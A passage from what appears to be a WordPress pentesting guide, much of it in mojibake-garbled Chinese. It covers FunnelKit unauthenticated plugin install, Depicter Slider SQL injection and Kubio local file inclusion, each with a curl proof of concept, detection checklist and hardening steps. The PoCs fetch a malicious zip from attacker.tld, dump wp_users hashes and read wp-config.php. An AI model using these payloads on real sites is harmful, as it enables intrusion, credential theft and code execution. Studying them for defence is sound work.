- ä»»ä½•åŸºäºè¯·æ±‚æä¾›çš„èº«ä»½ï¼ˆç”¨æˆ·å/ç”µå­é‚®ä»¶ï¼‰å‘æ”¾ä»¤ç‰Œ/å¯†é’¥ï¼Œä½†æœªå…³è”åˆ°å·²è®¤è¯ç”¨æˆ·æˆ– capability çš„è·¯ç”±
- æŸ¥æ‰¾åç»­è·¯ç”±ï¼Œå®ƒä»¬æ¥å—ç”Ÿæˆçš„ä»¤ç‰Œ/å¯†é’¥å´æ²¡æœ‰è¿›è¡ŒæœåŠ¡ç«¯çš„ capability æ£€æŸ¥

åŠ å›º
- å¯¹äºä»»ä½•æœ‰æƒé™çš„ REST è·¯ç”±ï¼šè¦æ±‚ permission_callbackï¼Œä¸”åœ¨å…¶å†…ä½¿ç”¨ current_user_can() æ¥æ£€æŸ¥æ‰€éœ€çš„ capability
- ä¸è¦æ ¹æ®å®¢æˆ·ç«¯æä¾›çš„èº«ä»½é“¸é€ é•¿å¯¿å‘½å¯†é’¥ï¼›å¦‚æœ‰å¿…è¦ï¼Œåº”åœ¨è®¤è¯åç­¾å‘çŸ­æœŸã€ç»‘å®šç”¨æˆ·çš„ä»¤ç‰Œï¼Œå¹¶åœ¨ä½¿ç”¨æ—¶é‡æ–°æ£€æŸ¥ capability
- éªŒè¯è°ƒç”¨è€…çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ï¼ˆä»…è°ƒç”¨ wp_set_current_user ä¸è¶³ä»¥ä¿è¯ï¼‰å¹¶æ‹’ç»æ»¡è¶³ !is_user_logged_in() || !current_user_can(<cap>) çš„è¯·æ±‚

---

## Nonce é—¨æ»¥ç”¨ â†’ æœªè®¤è¯çš„ä»»æ„æ’ä»¶å®‰è£… (FunnelKit Automations â‰¤ 3.5.3)

Nonces ç”¨äºé˜²æ­¢ CSRFï¼Œè€Œä¸æ˜¯ç”¨äºæˆæƒã€‚å¦‚æœä»£ç æŠŠ nonce éªŒè¯é€šè¿‡å½“ä½œæ”¾è¡Œï¼Œç„¶åè·³è¿‡å¯¹ç‰¹æƒæ“ä½œçš„ capability æ£€æŸ¥ï¼ˆä¾‹å¦‚å®‰è£…/æ¿€æ´» æ’ä»¶ï¼‰ï¼Œæœªè®¤è¯çš„æ”»å‡»è€…å¯ä»¥æ»¡è¶³å¼±çš„ nonce è¦æ±‚ï¼Œé€šè¿‡å®‰è£…å¸¦åé—¨æˆ–æœ‰æ¼æ´çš„æ’ä»¶è¾¾åˆ° RCEã€‚

- æ˜“å—å½±å“çš„è·¯å¾„: plugin/install_and_activate
- æ¼æ´ï¼šå¼±çš„ nonce hash æ£€æŸ¥ï¼›nonce â€œé€šè¿‡â€ åæ²¡æœ‰ current_user_can('install_plugins'|'activate_plugins') æ£€æŸ¥
- å½±å“ï¼šé€šè¿‡ä»»æ„æ’ä»¶å®‰è£…/æ¿€æ´»å¯¼è‡´å®Œå…¨å¦¥å

PoCï¼ˆå…·ä½“å½¢å¼å–å†³äºæ’ä»¶ï¼›ä»…ä½œç¤ºä¾‹ï¼‰
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## æœªç»è®¤è¯çš„ SQLi é€šè¿‡ depicter-* actions ä¸­çš„ s (search) å‚æ•° (Depicter Slider â‰¤ 3.6.1)

Multiple depicter-* actions consumed the s (search) parameter and concatenated it into SQL queries without parameterization.

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep depicter-* action handlers å¹¶æ£€æŸ¥åœ¨ SQL ä¸­ç›´æ¥ä½¿ç”¨ $_GET['s'] æˆ– $_POST['s']
- å®¡æŸ¥ä¼ å…¥ $wpdb->get_results()/query() çš„è‡ªå®šä¹‰æŸ¥è¯¢ï¼Œæ˜¯å¦é€šè¿‡ä¸²è”åŒ…å« s

Hardening
- å§‹ç»ˆä½¿ç”¨ $wpdb->prepare() æˆ– wpdb placeholdersï¼›åœ¨æœåŠ¡å™¨ç«¯æ‹’ç»æ„å¤–çš„å…ƒå­—ç¬¦
- ä¸º s æ·»åŠ ä¸¥æ ¼çš„å…è®¸åˆ—è¡¨ï¼Œå¹¶è§„èŒƒåŒ–ä¸ºé¢„æœŸçš„å­—ç¬¦é›†/é•¿åº¦

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

åœ¨æ¨¡æ¿å‚æ•°ä¸­æ¥å—æ”»å‡»è€…æ§åˆ¶çš„è·¯å¾„è€Œä¸è¿›è¡Œè§„èŒƒåŒ–/é™åˆ¶ï¼Œå…è®¸è¯»å–ä»»æ„æœ¬åœ°æ–‡ä»¶ï¼Œå¹¶ä¸”å¦‚æœå°†å¯åŒ…å«çš„ PHP/æ—¥å¿—æ–‡ä»¶æ‹‰å…¥è¿è¡Œæ—¶ï¼Œæœ‰æ—¶ä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚

- å‚æ•°: __kubio-site-edit-iframe-classic-template
- ç¼ºé™·: æœªè¿›è¡Œè§„èŒƒåŒ–/å…è®¸åˆ—è¡¨é™åˆ¶ï¼›å…è®¸éå†
- å½±å“: æœºå¯†æŠ«éœ² (wp-config.php)ï¼Œåœ¨ç‰¹å®šç¯å¢ƒä¸­å¯èƒ½å¯¼è‡´ RCEï¼ˆlog poisoning, includable PHPï¼‰

PoC â€“ è¯»å– wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
æ£€æµ‹æ¸…å•
- ä»»ä½• handler å°†è¯·æ±‚è·¯å¾„ä¸²è”åˆ° include()/require()/read sinks ä¸­ä¸”æœªä½¿ç”¨ realpath() è¿›è¡Œé™åˆ¶
- æŸ¥æ‰¾ traversal æ¨¡å¼ (../) å¯¼è‡´è¶…å‡ºé¢„æœŸ templates ç›®å½•

åŠ å›º
- å¼ºåˆ¶ä½¿ç”¨ allowlisted templatesï¼›ä½¿ç”¨ realpath() è§£æå¹¶è¦æ±‚ str_starts_with(realpath(file), realpath(allowed_base))
- è§„èŒƒåŒ–è¾“å…¥ï¼›æ‹’ç» traversal åºåˆ—å’Œç»å¯¹è·¯å¾„ï¼›ä»…å¯¹æ–‡ä»¶åï¼ˆéå®Œæ•´è·¯å¾„ï¼‰ä½¿ç”¨ sanitize_file_name()


## å‚è€ƒèµ„æ–™

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
